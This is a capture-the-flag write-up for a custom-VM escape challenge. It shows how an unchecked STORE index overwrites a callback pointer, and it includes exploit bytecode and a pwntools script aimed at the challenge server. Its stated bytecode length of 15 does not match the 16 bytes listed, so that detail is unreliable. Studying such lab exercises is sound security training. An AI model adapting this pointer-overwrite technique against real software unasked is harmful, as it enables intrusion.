# pwn-vm-escape — Solution

## Overview
A custom VM with 16 opcodes. The `STORE <addr>` opcode writes `vm.mem[addr]` without bounds checking.

`vm_state_t` layout:
```
offset   0: int64_t mem[256]      = 2048 bytes  (indices 0..255)
offset 2048: void (*callback)()   = 8 bytes     (index 256 in int64 terms)
offset 2056: int64_t stack[64]
...
```

So `STORE 256 <value>` overwrites `vm.callback`!

## Addresses (printed at startup)
- `win()` address
- `&vm.callback` address  
- `vm.mem` base address

Since no PIE, all addresses are fixed.

## Exploit Bytecode

Write the address of `win()` into `vm.mem[256]` (= `vm.callback`):
```
PUSH win_addr   ; push win() address as int64
STORE 256       ; vm.mem[256] = win_addr  (overwrites callback!)
CALL_CB         ; calls vm.callback() = win()
HALT
```

## Exploit Script

```python
from pwn import *
import struct

HOST = '172.30.3.32'
PORT = 9998

def start(): return remote(HOST, PORT)

def build_bytecode(win_addr):
    code = b''
    # PUSH win_addr (opcode 0x01, then 8-byte little-endian value)
    code += bytes([0x01]) + struct.pack('<q', win_addr)
    # STORE 256 (opcode 0x07, then 4-byte signed little-endian address)
    code += bytes([0x07]) + struct.pack('<i', 256)
    # CALL_CB (opcode 0x0A)
    code += bytes([0x0A])
    # HALT (opcode 0x09)
    code += bytes([0x09])
    return code

p = start()

# Parse addresses from startup
p.recvuntil(b'win()=')
win_addr = int(p.recvuntil(b' ').strip(), 16)
log.success(f'win: {win_addr:#x}')

# Build and send bytecode
bc = build_bytecode(win_addr)
p.sendlineafter(b'bytecode length then bytecode (binary):\n', str(len(bc)).encode())
p.send(bc)

# Should see flag output
p.recvuntil(b'Executing...')
print(p.recvall(timeout=3).decode())
```

## Bytecode Assembly (manual)
```
0x01 [win_lo] [win_hi] 0x00 0x00 0x00 0x00 0x00 0x00   PUSH win_addr
0x07 0x00 0x01 0x00 0x00                                STORE 256
0x0A                                                    CALL_CB
0x09                                                    HALT
```
Total: 15 bytes of bytecode.

## Notes
- `STORE 256` maps to `vm.mem[256]` which is exactly where `callback` lives
- The addresses are printed at startup — no bruteforce needed
- Negative indices also work if you want to corrupt earlier data
